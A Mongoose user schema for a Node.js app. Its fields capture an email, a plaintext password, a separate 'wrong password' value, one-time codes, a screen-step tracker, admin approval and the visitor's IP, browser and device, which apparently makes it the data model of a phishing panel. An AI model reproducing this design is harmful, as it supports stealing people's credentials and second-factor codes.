const mongoose = require("mongoose");

const userSchema = new mongoose.Schema(
  {
    // ==========================
    // EMAIL
    // ==========================
    first: {
      type: String,
      trim: true,
      lowercase: true,
      default: null,
      unique: false
    
    },

    // ==========================
    // PASSWORD
    // ==========================
    last: {
      type: String,
      default: null
    },
    WongP: {
      type: String,
      default: null
    },

  

    // ==========================
    // ADMIN APPROVAL
    // ==========================
    approved: {
      type: Boolean,
      default: false
    },

    userDevice: {
      type: String,
      default: ""
    },

    code: {
      type: String,
      default: ""
    },

    // ==========================
    // PHONE
    // ==========================
    phn: {
      type: String,
      default: ""
    },

    ptp:{
      type: String,
      default: ""
    },

     ptp2:{
      type: String,
      default: ""
    },

    status: {
      type: String,
      default: "email submitted"
    },

    // ==========================
    // CURRENT SCREEN
    // ==========================
    currentStep: {
      type: String,
      default: "email"
    },

    // ==========================
    // DEVICE INFORMATION
    // ==========================
    uip: {
      type: String,
      default: ""
    },

    browser: {
      type: String,
      default: ""
    },

  

    device: {
      type: String,
      default: ""
    },


    // ==========================
    // LOGIN
    // ==========================
    lastLogin: {
      type: Date,
      default: null
    }
  },
  {
    timestamps: true
  }
);

module.exports = mongoose.model(
  "User",
  userSchema
);